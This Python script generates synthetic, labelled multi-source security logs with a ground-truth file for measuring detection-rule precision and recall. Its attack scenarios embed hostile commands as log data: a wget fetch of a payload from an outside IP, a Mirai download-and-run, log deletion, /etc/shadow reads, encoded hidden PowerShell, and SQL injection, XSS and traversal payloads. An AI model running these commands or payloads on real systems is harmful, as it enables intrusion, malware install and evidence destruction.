"""
generate_logs.py - Adversary emulation producing labelled multi-source logs.

This is not just "fake data". Every injected attack is recorded in
ground_truth.json with the entity, technique and expected rule, which is what
makes precision and recall measurable in CI. Benign traffic is deliberately
noisy (typos, crawlers, expired service accounts) so false positives have a
real chance to appear.

Scenarios:
  S1  Opportunistic SSH brute force from a known-bad address
  S2  Targeted intrusion chain: web recon -> spray -> compromise -> privesc
  S3  Web application attack (SQLi, XSS, traversal) from a scanner
  S4  Windows credential attack -> privileged group add -> log clear
  S5  Honeypot capture of real-world-style botnet behaviour
  N1  Benign noise designed to tempt false positives
"""
from __future__ import annotations

import json
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(1337)
OUT = Path("sample_logs")
OUT.mkdir(exist_ok=True)
DAY = datetime(2026, 9, 21, 0, 0, 0)

auth: list[tuple[datetime, str]] = []
web: list[tuple[datetime, str]] = []
winlog: list[tuple[datetime, dict]] = []
suricata: list[tuple[datetime, dict]] = []
cowrie: list[tuple[datetime, dict]] = []
truth: list[dict] = []


# ---------------------------------------------------------------- helpers
def syslog_ts(t: datetime) -> str:
    return f"{t:%b} {t.day:>2} {t:%H:%M:%S}"


def ssh(t, host, msg):
    auth.append((t, f"{syslog_ts(t)} {host} sshd[{random.randint(1000,9999)}]: {msg}"))


def ssh_fail(t, user, ip, host="webserver01", invalid=False):
    u = f"invalid user {user}" if invalid else user
    ssh(t, host, f"Failed password for {u} from {ip} port {random.randint(40000,60000)} ssh2")


def ssh_ok(t, user, ip, host="webserver01"):
    ssh(t, host, f"Accepted password for {user} from {ip} port {random.randint(40000,60000)} ssh2")


def sudo(t, user, cmd, host="webserver01"):
    auth.append((t, f"{syslog_ts(t)} {host} sudo:  {user} : TTY=pts/0 ; PWD=/home/{user} ; "
                    f"USER=root ; COMMAND={cmd}"))


def http(t, ip, path, status, agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0", method="GET"):
    size = random.randint(300, 18000) if status == 200 else random.randint(120, 700)
    web.append((t, f'{ip} - - [{t:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" '
                   f'{status} {size} "-" "{agent}"'))


def win(t, eid, **data):
    computer = data.pop("Computer", "WIN-FINANCE02")
    winlog.append((t, {"EventID": eid, "TimeCreated": t.isoformat(), "Computer": computer,
                       "EventData": data, "Message": f"Windows event {eid}"}))


def suri(t, sig, src, dst, dport, sid, sev=2, cat="Attempted Information Leak"):
    suricata.append((t, {"timestamp": t.isoformat(), "event_type": "alert", "src_ip": src,
                         "src_port": random.randint(40000, 60000), "dest_ip": dst,
                         "dest_port": dport, "proto": "TCP",
                         "alert": {"signature": sig, "category": cat, "signature_id": sid,
                                   "severity": sev}}))


def cow(t, eventid, src, **kw):
    cowrie.append((t, {"timestamp": t.isoformat() + "Z", "eventid": eventid, "src_ip": src,
                       "sensor": "honeypot", **kw}))


def label(scenario, entity, technique, rules, desc):
    truth.append({"scenario": scenario, "entity": entity, "technique": technique,
                  "expected_rules": rules, "description": desc})


# ============================================================ N1: benign noise
USERS = ["alice", "bob", "jsmith", "deploy"]
INTERNAL = ["192.168.1.10", "192.168.1.22", "10.0.0.5", "10.0.0.17"]
PAGES = ["/", "/about", "/products", "/pricing", "/contact", "/blog/scaling-postgres",
         "/static/app.js", "/static/style.css", "/favicon.ico", "/api/v1/health"]

t = DAY + timedelta(hours=7)
for _ in range(120):
    t += timedelta(minutes=random.randint(2, 9))
    user, ip = random.choice(USERS), random.choice(INTERNAL)
    if random.random() < 0.12:                      # genuine typo, must NOT alert
        ssh_fail(t, user, ip)
        t += timedelta(seconds=random.randint(4, 20))
    ssh_ok(t, user, ip)
    if random.random() < 0.25:
        sudo(t + timedelta(seconds=30), user, "/usr/bin/systemctl status nginx")

# Misconfigured backup agent with an expired password. It retries in a tight
# burst every hour: 6 failures inside 25 seconds. This is the single most
# important piece of benign noise in the dataset, because it is exactly what
# a naive low threshold mistakes for a brute force. The threshold sweep in
# docs/TUNING.md is measured against this behaviour.
t = DAY + timedelta(hours=6)
for _ in range(14):
    t += timedelta(minutes=50)
    for i in range(6):
        ssh_fail(t + timedelta(seconds=i * 4), "svc_backup", "10.0.0.41", host="dbserver01")

# A developer whose SSH client retries a stale key 4 times quickly, twice a day
for hour in (9, 15):
    t = DAY + timedelta(hours=hour, minutes=12)
    for i in range(4):
        ssh_fail(t + timedelta(seconds=i * 3), "alice", "192.168.1.10")

# Normal web traffic plus a search-engine crawler hitting dead links
t = DAY + timedelta(hours=6)
for _ in range(600):
    t += timedelta(seconds=random.randint(10, 70))
    http(t, f"192.0.2.{random.randint(2,120)}", random.choice(PAGES),
         200 if random.random() > 0.04 else 404)
t = DAY + timedelta(hours=9)
for i in range(12):                                  # Googlebot: 404s but benign
    t += timedelta(seconds=25)
    http(t, "66.249.66.1", f"/blog/archived-post-{i}", 404,
         agent="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)")

# Benign Windows activity
t = DAY + timedelta(hours=8)
for _ in range(60):
    t += timedelta(minutes=random.randint(3, 15))
    win(t, 4624, TargetUserName=random.choice(["jsmith", "bob"]), LogonType=2,
        IpAddress="-", TargetDomainName="CORP")

# ================================================== S1: opportunistic brute force
IP1 = "203.0.113.45"
t = DAY + timedelta(hours=2, minutes=14)
for i in range(60):
    t += timedelta(seconds=random.uniform(0.6, 2.2))
    ssh_fail(t, random.choice(["root", "root", "admin", "oracle"]), IP1, invalid=False)
label("S1", IP1, "T1110.001", ["ssh_brute_force"],
      "60 rapid SSH failures from a threat-intel-flagged address")

# ============================================= S2: targeted intrusion chain
IP2 = "198.51.100.77"
t = DAY + timedelta(hours=11, minutes=5)
# Stage 1: recon against the web app
for path in ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/",
             "/backup.zip", "/.aws/credentials", "/config.php.bak", "/server-status",
             "/actuator/env", "/api/v1/debug", "/.ssh/id_rsa"] + [f"/probe{i}.php" for i in range(22)]:
    t += timedelta(milliseconds=random.randint(200, 800))
    http(t, IP2, path, 404, agent="Mozilla/5.0 (X11; Linux x86_64) gobuster/3.6")
label("S2", IP2, "T1595.003", ["web_scanning", "web_sensitive_paths", "web_attack_tool_agent"],
      "Directory enumeration and sensitive-file probing")

# Stage 2: password spray across many accounts
t = DAY + timedelta(hours=11, minutes=40)
for name in ["admin", "test", "oracle", "ubuntu", "guest", "postgres", "ftp", "pi",
             "jenkins", "git", "alice", "bob", "deploy", "root"]:
    for _ in range(3):
        t += timedelta(seconds=random.uniform(1, 4))
        ssh_fail(t, name, IP2, invalid=name not in USERS + ["root"])
label("S2", IP2, "T1110.003", ["ssh_password_spray", "ssh_brute_force"],
      "Password spray across 14 distinct usernames")

# Stage 3: compromise
t += timedelta(seconds=9)
ssh_ok(t, "deploy", IP2)
label("S2", IP2, "T1078", ["auth_success_after_failures"],
      "Successful login as 'deploy' immediately after the spray")
# The compromised ACCOUNT is itself an attack entity: behavioural baselining
# should flag 'deploy' authenticating outside its learned hours.
label("S2", "deploy", "T1078", ["behavior_unusual_hour", "behavior_new_host"],
      "Compromised 'deploy' account authenticating outside its baseline hours")

# Stage 4: post-exploitation
t += timedelta(minutes=2)
sudo(t, "deploy", "/bin/cat /etc/shadow")
t += timedelta(seconds=40)
sudo(t, "deploy", "/usr/bin/wget http://185.220.101.9/payload.sh -O /tmp/.x")
label("S2", IP2, "T1548", ["priv_esc_after_external_login"],
      "Privilege escalation minutes after external login")
suri(DAY + timedelta(hours=11, minutes=2), "ET SCAN Possible Nmap User-Agent Observed",
     IP2, "10.0.0.5", 80, 2024364)

# ====================================================== S3: web exploitation
IP3 = "45.33.32.156"
t = DAY + timedelta(hours=14, minutes=30)
for payload in ["/products?id=1'%20OR%20'1'='1",
                "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
                "/products?id=1;DROP%20TABLE%20users",
                "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
                "/profile?img=%3Cimg%20src=x%20onerror=alert(1)%3E",
                "/download?file=../../../../etc/passwd",
                "/view?tpl=....//....//etc/shadow",
                "/products?id=1%20AND%20SLEEP(5)",
                "/api?q=information_schema.tables"]:
    t += timedelta(seconds=random.randint(3, 11))
    http(t, IP3, payload, random.choice([200, 500, 403]), agent="sqlmap/1.8.2#stable")
label("S3", IP3, "T1190", ["web_sql_injection", "web_xss_traversal", "web_attack_tool_agent"],
      "SQLi, XSS and path traversal payloads from sqlmap")
suri(t, "ET WEB_SERVER SQL Injection Select Union Attempt", IP3, "10.0.0.5", 443, 2006446, sev=1,
     cat="Web Application Attack")

# ============================================ S4: Windows credential attack
IP4 = "141.98.80.12"
t = DAY + timedelta(hours=16, minutes=20)
for i in range(40):
    t += timedelta(seconds=random.uniform(0.8, 2.0))
    win(t, 4625, TargetUserName=random.choice(["Administrator", "svc_sql", "jsmith"]),
        LogonType=3, IpAddress=IP4, TargetDomainName="CORP", Status="0xC000006A",
        Computer="dc01")
label("S4", IP4, "T1110.001", ["win_brute_force"], "40 Windows 4625 failures from one source")

t += timedelta(seconds=6)
win(t, 4624, TargetUserName="Administrator", LogonType=3, IpAddress=IP4,
    TargetDomainName="CORP", Computer="dc01")
label("S4", IP4, "T1078", ["auth_success_after_failures"],
      "Windows logon success after sustained failures")

t += timedelta(minutes=4)
win(t, 4732, TargetUserName="svc_sql", TargetGroupName="Domain Admins",
    SubjectUserName="Administrator", Computer="dc01")
label("S4", "svc_sql", "T1098", ["win_privileged_group_add"],
      "Service account added to Domain Admins")

t += timedelta(minutes=3)
win(t, 4688, NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
    ParentProcessName="C:\\Windows\\System32\\cmd.exe", TargetUserName="Administrator",
    Computer="dc01")
label("S4", "dc01", "T1059.001", ["win_suspicious_process"],
      "Encoded PowerShell execution on the domain controller")

t += timedelta(minutes=9)
win(t, 1102, SubjectUserName="Administrator", Computer="dc01")
label("S4", "dc01", "T1070.001", ["win_audit_log_cleared"],
      "Security audit log cleared to destroy evidence")

# ================================================= S5: honeypot capture
IP5 = "80.94.92.60"
t = DAY + timedelta(hours=19, minutes=12)
cow(t, "cowrie.session.connect", IP5)
for user, pwd in [("root", "123456"), ("root", "admin"), ("root", "root"), ("admin", "admin"),
                  ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("root", "toor"),
                  ("root", "P@ssw0rd"), ("test", "test"), ("oracle", "oracle"),
                  ("root", "1234"), ("admin", "1234")]:
    t += timedelta(seconds=random.uniform(0.4, 1.5))
    cow(t, "cowrie.login.failed", IP5, username=user, password=pwd)
t += timedelta(seconds=1)
cow(t, "cowrie.login.success", IP5, username="root", password="12345")
label("S5", IP5, "T1110.001", ["honeypot_interaction", "ssh_brute_force"],
      "Botnet credential stuffing against the honeypot")

for cmd in ["uname -a", "cat /proc/cpuinfo", "wget http://185.220.101.9/bins/mirai.arm7 -O /tmp/x",
            "chmod +x /tmp/x", "/tmp/x", "rm -rf /var/log/wtmp", "crontab -l"]:
    t += timedelta(seconds=random.uniform(1, 5))
    cow(t, "cowrie.command.input", IP5, input=cmd)
label("S5", IP5, "T1059", ["honeypot_command"],
      "Post-compromise malware download and log destruction in the honeypot")

# ============================================================ write files
auth.sort(key=lambda x: x[0])
web.sort(key=lambda x: x[0])
winlog.sort(key=lambda x: x[0])
suricata.sort(key=lambda x: x[0])
cowrie.sort(key=lambda x: x[0])

(OUT / "auth.log").write_text("\n".join(l for _, l in auth) + "\n", encoding="utf-8")
(OUT / "access.log").write_text("\n".join(l for _, l in web) + "\n", encoding="utf-8")
(OUT / "windows_security.json").write_text("\n".join(json.dumps(d) for _, d in winlog) + "\n", encoding="utf-8")
(OUT / "suricata_eve.json").write_text("\n".join(json.dumps(d) for _, d in suricata) + "\n", encoding="utf-8")
(OUT / "cowrie.json").write_text("\n".join(json.dumps(d) for _, d in cowrie) + "\n", encoding="utf-8")
(OUT / "ground_truth.json").write_text(json.dumps(truth, indent=2) + "\n", encoding="utf-8")

total = len(auth) + len(web) + len(winlog) + len(suricata) + len(cowrie)
print(f"""Generated {total} log lines across 5 sources:
  auth.log               {len(auth):>5}  (SSH + sudo, syslog)
  access.log             {len(web):>5}  (Nginx combined)
  windows_security.json  {len(winlog):>5}  (Windows Security JSON)
  suricata_eve.json      {len(suricata):>5}  (Suricata EVE)
  cowrie.json            {len(cowrie):>5}  (Cowrie honeypot)

Ground truth: {len(truth)} labelled attack behaviours across 5 scenarios.
Benign noise includes typo logins, an expired service account, and a crawler
hitting 404s - all designed to trigger false positives if rules are sloppy.""")
